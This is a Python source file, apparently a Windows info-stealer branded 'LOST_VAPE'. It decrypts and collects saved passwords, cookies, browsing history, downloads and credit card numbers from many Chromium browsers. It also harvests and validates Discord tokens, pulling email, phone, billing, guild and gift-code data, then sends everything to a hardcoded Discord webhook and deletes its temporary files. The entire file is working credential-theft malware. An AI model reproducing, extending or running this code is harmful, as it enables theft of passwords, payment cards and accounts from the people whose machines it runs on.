
import json,os, requests, base64, shutil, sqlite3, re
from urllib.request import urlopen, Request
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from pathlib import Path
from zipfile import ZipFile

from discord import SyncWebhook
from discord import Embed
from discord_webhook import DiscordWebhook



wh00k = 'https://discord.com/api/webhooks/1311436399634939966/3p8XegAjpLpCtcOxTnTsdsNMk7f2z9DMzGl5Qw_gB8BwU3KqAEfgU9v4XvoZ0QZBA9W1'

requesth = 'grb'

if requesth == 'grb':

    
    
    
    def send_webhook(url, data, headers):
        response = requests.post(url, data=data, headers=headers)
        print(response.text)  # Affiche la réponse du serveur (peut être supprimé si vous ne voulez pas l'afficher)
    
    
    ############################################IP######################################################################
    
    def g3t1p():
        global ip
        ip = "yy"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except Exception as e:
            print(f"Error fetching IP: {e}")
        return ip
    
    requirements = [
        ["requests", "requests"],
        ["Crypto.Cipher", "pycryptodome"],
    ]
    
    print(g3t1p())
    #####################################################Geoloc###################################################################
    
    def globalInfo():
        global pp
        global countryCode
        global ctry
        us3rn4m1 = os.getenv("USERNAME")
    
        try:
            response = urlopen(Request(f"https://geolocation-db.com/json/{ip}")).read().decode()
            response_data = json.loads(response)
    
            country = response_data["country_name"]
            countryCode = response_data["country_code"].lower()
            state = response_data["state"]
            print(str(countryCode))
    
            pp = [country, countryCode, state, us3rn4m1]
            ctry = [countryCode]
    
            globalinfo = f":flag_{countryCode}:  ({country})`"
            print(str(countryCode))
            print(str(pp))
            return print(globalinfo)
    
    
        except Exception as e:
            print(f"Error processing geolocation data: {e}")
            return
    
    globalInfo()
    
    
    #####################################################drap#########################################################################
    
    def drap():
        global rt
    
        ob = str(ctry).strip('[]').strip("''")
        print(ob)
        # Parcours du dictionnaire
        if ob == 'fr':
            rt = ':flag_fr:'
        elif ob == 'en':
            rt = '::england:'
        elif ob == 'nl':
            rt = ':flag_nl:'
        elif ob == 'jp':
            rt = ':flag_jp:'
        elif ob == 'us':
            rt = ':flag_:'
    
    drap()
    
    ########################################################class#####################################################################
    
    pfp = ''
    em31l = ''
    ph0n3 = ''
    g3t1p = g3t1p()
    n1tr0 = ''
    b4dg3 = ''
    friends = ''
    b1ll1ng = ''
    us3rn4m1 = 'LOST_VAPE'
    hashtag = ''
    idd = ''
    
    ###########################################################################################################################
    
    
    
    ############################################################################################################################################
    
    
    __LOGINS__ = []
    __COOKIES__ = []
    __WEB_HISTORY__ = []
    __DOWNLOADS__ = []
    __CARDS__ = []
    
    
    class Upload:
        def __init__(self, webhook_url):
            self.webhook_url = webhook_url
            self.write_files()
            self.send()
            self.clean()
    
        def write_files(self):
            os.makedirs("vault", exist_ok=True)
    
            if __LOGINS__:
                with open("vault\\logins.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __LOGINS__))
    
            if __COOKIES__:
                with open("vault\\cookies.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __COOKIES__))
    
            if __WEB_HISTORY__:
                with open("vault\\web_history.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __WEB_HISTORY__))
    
            if __DOWNLOADS__:
                with open("vault\\downloads.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __DOWNLOADS__))
    
            if __CARDS__:
                with open("vault\\cards.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __CARDS__))
    
            with ZipFile("vault.zip", "w") as zip:
                for file in os.listdir("vault"):
                    zip.write(f"vault\\{file}", file)
    
        def send(self):
            webhook = DiscordWebhook(url=self.webhook_url)
            embed = Embed(
                title="Vault",
                description="```" +
                            '\n'.join(self.tree(Path("vault"))) + "```",
            )
    
            embed_dict = {
                "title": embed.title,
                "description": embed.description,
                "type": "rich",
                "url": embed.url,
                "timestamp": embed.timestamp,
                "footer": {
                    "text": embed.footer.text,
                    "icon_url": embed.footer.icon_url,
                },
                "image": {
                    "url": embed.image.url,
                },
                "thumbnail": {
                    "url": embed.thumbnail.url,
                },
                "author": {
                    "name": embed.author.name,
                    "url": embed.author.url,
                    "icon_url": embed.author.icon_url,
                },
                "fields": [
                    {
                        "name": field.name,
                        "value": field.value,
                        "inline": field.inline,
                    }
                    for field in embed.fields
                ],
                "color": embed.color.value if embed.color else None,
            }
    
            webhook.add_embed(embed_dict)
            webhook.add_file(file=open("vault.zip", "rb"), filename="vault.zip")
            webhook.username = "Lost_Vape.exe"
            webhook.avatar_url = "https://i.imgur.com/HjzfjfR.png"
            webhook.execute()
    
        def clean(self):
            shutil.rmtree("vault")
            os.remove("vault.zip")
    
        def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
            pipes = {
                'space': '    ',
                'branch': '│   ',
                'tee': '├── ',
                'last': '└── ',
            }
    
            if prefix == '':
                yield midfix_folder + path.name
    
            contents = list(path.iterdir())
            pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
            for pointer, path in zip(pointers, contents):
                if path.is_dir():
                    yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                    extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                    yield from self.tree(path, prefix=prefix+extension)
                else:
                    yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
    
    
    class Chromium:
        def __init__(self,):
            self.appdata = os.getenv('LOCALAPPDATA')
            self.browsers = {
                'amigo': self.appdata + '\\Amigo\\User Data',
                'torch': self.appdata + '\\Torch\\User Data',
                'kometa': self.appdata + '\\Kometa\\User Data',
                'orbitum': self.appdata + '\\Orbitum\\User Data',
                'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                '7star': self.appdata + '\\7Star\\7Star\\User Data',
                'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': self.appdata + '\\Iridium\\User Data',
            }
            self.profiles = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
            ]
    
            for _, path in self.browsers.items():
                if not os.path.exists(path):
                    continue
    
                self.master_key = self.get_master_key(f'{path}\\Local State')
                if not self.master_key:
                    continue
    
                for profile in self.profiles:
                    if not os.path.exists(path + '\\' + profile):
                        continue
    
                    operations = [
                        self.get_login_data,
                        self.get_cookies,
                        self.get_web_history,
                        self.get_downloads,
                        self.get_credit_cards,
                    ]
    
                    for operation in operations:
                        try:
                            operation(path, profile)
                        except Exception as e:
                            # print(e)
                            pass
    
        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return
    
            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return
    
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
    
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    
        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode(errors='replace')
    
            return decrypted_pass
    
        def get_login_data(self, path: str, profile: str):
            login_db = f'{path}\\{profile}\\Login Data'
            if not os.path.exists(login_db):
                return
    
            shutil.copy(login_db, 'login_db')
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
    
                password = self.decrypt_password(row[2], self.master_key)
                __LOGINS__.append(Types.Login(row[0], row[1], password))
    
            conn.close()
            os.remove('login_db')
    
        def get_cookies(self, path: str, profile: str):
            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
            if not os.path.exists(cookie_db):
                return
    
            try:
                shutil.copy(cookie_db, 'cookie_db')
                conn = sqlite3.connect('cookie_db')
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue
    
                    cookie = self.decrypt_password(row[3], self.master_key)
                    __COOKIES__.append(Types.Cookie(
                        row[0], row[1], row[2], cookie, row[4]))
    
                conn.close()
            except Exception as e:
                print(e)
    
            os.remove('cookie_db')
    
        def get_web_history(self, path: str, profile: str):
            web_history_db = f'{path}\\{profile}\\History'
            if not os.path.exists(web_history_db):
                return
    
            shutil.copy(web_history_db, 'web_history_db')
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
    
                __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))
    
            conn.close()
            os.remove('web_history_db')
    
        def get_downloads(self, path: str, profile: str):
            downloads_db = f'{path}\\{profile}\\History'
            if not os.path.exists(downloads_db):
                return
    
            shutil.copy(downloads_db, 'downloads_db')
            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
    
                __DOWNLOADS__.append(Types.Download(row[0], row[1]))
    
            conn.close()
            os.remove('downloads_db')
    
        def get_credit_cards(self, path: str, profile: str):
            cards_db = f'{path}\\{profile}\\Web Data'
            if not os.path.exists(cards_db):
                return
    
            shutil.copy(cards_db, 'cards_db')
            conn = sqlite3.connect('cards_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
    
                card_number = self.decrypt_password(row[3], self.master_key)
                __CARDS__.append(Types.CreditCard(
                    row[0], row[1], row[2], card_number, row[4]))
    
            conn.close()
            os.remove('cards_db')
    
    
    class Types:
        class Login:
            def __init__(self, url, username, password):
                self.url = url
                self.username = username
                self.password = password
    
            def __str__(self):
                return f'{self.url}\t{self.username}\t{self.password}'
    
            def __repr__(self):
                return self.__str__()
    
        class Cookie:
            def __init__(self, host, name, path, value, expires):
                self.host = host
                self.name = name
                self.path = path
                self.value = value
                self.expires = expires
    
            def __str__(self):
                return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
    
            def __repr__(self):
                return self.__str__()
    
        class WebHistory:
            def __init__(self, url, title, timestamp):
                self.url = url
                self.title = title
                self.timestamp = timestamp
    
            def __str__(self):
                return f'{self.url}\t{self.title}\t{self.timestamp}'
    
            def __repr__(self):
                return self.__str__()
    
        class Download:
            def __init__(self, tab_url, target_path):
                self.tab_url = tab_url
                self.target_path = target_path
    
            def __str__(self):
                return f'{self.tab_url}\t{self.target_path}'
    
            def __repr__(self):
                return self.__str__()
    
        class CreditCard:
            def __init__(self, name, month, year, number, date_modified):
                self.name = name
                self.month = month
                self.year = year
                self.number = number
                self.date_modified = date_modified
    
            def __str__(self):
                return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'
    
            def __repr__(self):
                return self.__str__()
    
    Chromium()
    # Assurez-vous que le webhook_url est correctement défini avant d'instancier la classe
    webhook_url = wh00k
    uploader = Upload(webhook_url)
    
    #############################################################grb###################################################################################################################################
    
    
    
    
    
    # envvoi webhook
    headers = {'Content-Type': 'application/json'}
    #print("Embed Data:", embed_data)
    
    
    
    
    class extract_tokens:
        global token
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
    
            self.tokens, self.uids = [], []
    
            self.extract()
    
        def extract(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }
    
            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                                              1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
    
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                        'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
    
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                        'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
    
            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                        'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
    
        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token.encode('utf-8')})
            if r.status_code == 200:
                return True
            return False
    
        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode(errors='replace')  # Use 'errors='replace''
            return decrypted_pass
    
    
    
        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return
    
            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return
    
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
    
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    
            return master_key
    
    
    class upload_tokens:
        def __init__(self, webhook: str):
            self.tokens = extract_tokens().tokens
            self.webhook = SyncWebhook.from_url(webhook)
    
        def calc_flags(self, flags: int) -> list:
            flags_dict = {
                "DISCORD_EMPLOYEE": {
                    "emoji": "<:staff:968704541946167357>",
                    "shift": 0,
                    "ind": 1
                },
                "DISCORD_PARTNER": {
                    "emoji": "<:partner:968704542021652560>",
                    "shift": 1,
                    "ind": 2
                },
                "HYPESQUAD_EVENTS": {
                    "emoji": "<:hypersquad_events:968704541774192693>",
                    "shift": 2,
                    "ind": 4
                },
                "BUG_HUNTER_LEVEL_1": {
                    "emoji": "<:bug_hunter_1:968704541677723648>",
                    "shift": 3,
                    "ind": 4
                },
                "HOUSE_BRAVERY": {
                    "emoji": "<:hypersquad_1:968704541501571133>",
                    "shift": 6,
                    "ind": 64
                },
                "HOUSE_BRILLIANCE": {
                    "emoji": "<:hypersquad_2:968704541883261018>",
                    "shift": 7,
                    "ind": 128
                },
                "HOUSE_BALANCE": {
                    "emoji": "<:hypersquad_3:968704541874860082>",
                    "shift": 8,
                    "ind": 256
                },
                "EARLY_SUPPORTER": {
                    "emoji": "<:early_supporter:968704542126510090>",
                    "shift": 9,
                    "ind": 512
                },
                "BUG_HUNTER_LEVEL_2": {
                    "emoji": "<:bug_hunter_2:968704541774217246>",
                    "shift": 14,
                    "ind": 16384
                },
                "VERIFIED_BOT_DEVELOPER": {
                    "emoji": "<:verified_dev:968704541702905886>",
                    "shift": 17,
                    "ind": 131072
                },
                "ACTIVE_DEVELOPER": {
                    "emoji": "<:Active_Dev:1045024909690163210>",
                    "shift": 22,
                    "ind": 4194304
                },
                "CERTIFIED_MODERATOR": {
                    "emoji": "<:certified_moderator:988996447938674699>",
                    "shift": 18,
                    "ind": 262144
                },
                "SPAMMER": {
                    "emoji": "⌨",
                    "shift": 20,
                    "ind": 1048704
                },
            }
    
            return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
    
        def upload(self):
            if not self.tokens:
                return
    
            for token in self.tokens:
                user = requests.get(
                    'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                billing = requests.get(
                    'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
                guilds = requests.get(
                    'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
                friends = requests.get(
                    'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
                gift_codes = requests.get(
                    'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
    
                username = user['username'] + '#' + user['discriminator']
                user_id = user['id']
                email = user['email']
                phone = user['phone']
                mfa = user['mfa_enabled']
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
                    f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
                badges = ' '.join([flag[0]
                                   for flag in self.calc_flags(user['public_flags'])])
    
                if user['premium_type'] == 0:
                    nitro = 'None'
                elif user['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif user['premium_type'] == 2:
                    nitro = 'Nitro'
                elif user['premium_type'] == 3:
                    nitro = 'Nitro Basic'
                else:
                    nitro = 'None'
    
                if billing:
                    payment_methods = []
    
                    for method in billing:
                        if method['type'] == 1:
                            payment_methods.append('💳')
    
                        elif method['type'] == 2:
                            payment_methods.append("<:paypal:973417655627288666>")
    
                        else:
                            payment_methods.append('❓')
    
                    payment_methods = ', '.join(payment_methods)
    
                else:
                    payment_methods = None
    
                if guilds:
                    hq_guilds = []
                    for guild in guilds:
                        admin = True if guild['permissions'] == '4398046511103' else False
                        if admin and guild['approximate_member_count'] >= 100:
                            owner = "✅" if guild['owner'] else "❌"
    
                            invites = requests.get(
                                f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                            if len(invites) > 0:
                                invite = f"https://discord.gg/{invites[0]['code']}"
                            else:
                                invite = "https://youtu.be/dQw4w9WgXcQ"
    
                            data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
    
                            if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                                break
    
                            hq_guilds.append(data)
    
                    if len(hq_guilds) > 0:
                        hq_guilds = '\n'.join(hq_guilds)
    
                    else:
                        hq_guilds = None
    
                else:
                    hq_guilds = None
    
                if friends:
                    hq_friends = []
                    for friend in friends:
                        unprefered_flags = [64, 128, 256, 1048704]
                        inds = [flag[1] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]]
                        for flag in unprefered_flags:
                            inds.remove(flag) if flag in inds else None
                        if inds != []:
                            hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                                friend['user']['public_flags'])[::-1]])
    
                            data = f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`"
    
                            if len('\n'.join(hq_friends)) + len(data) >= 1024:
                                break
    
                            hq_friends.append(data)
    
                    if len(hq_friends) > 0:
                        hq_friends = '\n'.join(hq_friends)
    
                    else:
                        hq_friends = None
    
                else:
                    hq_friends = None
    
                if gift_codes:
                    codes = []
                    for code in gift_codes:
                        name = code['promotion']['outbound_title']
                        code = code['code']
    
                        data = f":gift: `{name}`\n:ticket: `{code}`"
    
                        if len('\n\n'.join(codes)) + len(data) >= 1024:
                            break
    
                        codes.append(data)
    
                    if len(codes) > 0:
                        codes = '\n\n'.join(codes)
    
                    else:
                        codes = None
    
                else:
                    codes = None
                embed_data = {
                    "title":'', # f'{globalInfo()} | `{path}`',
                    "color": 2895667,
                    "thumbnail": {"url": f"{pfp}"},
                    "author": {
                        "name": f"{us3rn4m1}{hashtag}{idd}",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                    },
                    "footer": {
                        "text": "LOST_VAPE",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                    },
                    "fields": [
                        {"name": "<a:hyperNOPPERS:828369518199308388> Token:", "value": f"```{ph0n3}```", "inline": True},
                        {"name": "<:mail:750393870507966486> Email:", "value": f"```{em31l}```", "inline": True},
                        {"name": "<a:1689_Ringing_Phone:755219417075417088> Phone:", "value": f"```{ph0n3}```", "inline": True},
                        {"name": "<:mc_earth:589630396476555264> IP:", "value": f"```{g3t1p}```", "inline": True},
                        {"name": "<:woozyface:874220843528486923> Badges:", "value": f"{n1tr0}{b4dg3}", "inline": True},
                        {"name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:", "value": f"{b1ll1ng}", "inline": True},
                        {"name": "<a:mavikirmizi:853238372591599617> HQ Friends:", "value": f"{friends}", "inline": False}
                    ]
                }
                embed = Embed(title=f"{username} ({user_id})", color=0x000000)
                embed.set_thumbnail(url=avatar)
                global t0k3n
                t0k3n = token
                embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
                                value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
                embed.add_field(
                    name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
                embed.add_field(name="<a:redboost:996004230345281546> Badges:",
                                value=f"{badges if badges != '' else 'None'}", inline=True)
                embed.add_field(name="<a:pinklv:996004222090891366> Billing:",
                                value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
                embed.add_field(name="<:mfa:1021604916537602088> MFA:",
                                value=f"{mfa}", inline=True)
    
                embed.add_field(name="\u200b", value="\u200b", inline=False)
    
                embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
                                value=f"{email if email != None else 'None'}", inline=True)
                embed.add_field(name="<:starxglow:996004217699434496> Phone:",
                                value=f"{phone if phone != None else 'None'}", inline=True)
    
                embed.add_field(name="\u200b", value="\u200b", inline=False)
    
                if hq_guilds != None:
                    embed.add_field(
                        name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
                    embed.add_field(name="\u200b", value="\u200b", inline=False)
    
                if hq_friends != None:
                    embed.add_field(
                        name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                    embed.add_field(name="\u200b", value="\u200b", inline=False)
    
                if codes != None:
                    embed.add_field(
                        name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                    embed.add_field(name="\u200b", value="\u200b", inline=False)
    
                embed.set_footer(text="")
    
                self.webhook.send(embed=embed, username="Trin",
                                  avatar_url="https://i.imgur.com/HjzfjfR.png")
    
    #######################################################################################################################################
    
    headers = {'Content-Type': 'application/json'}
    
    class DiscordToken:
        def __init__(self, webhook):
            upload_tokens(webhook).upload()
    
    
    
    DiscordToken(wh00k)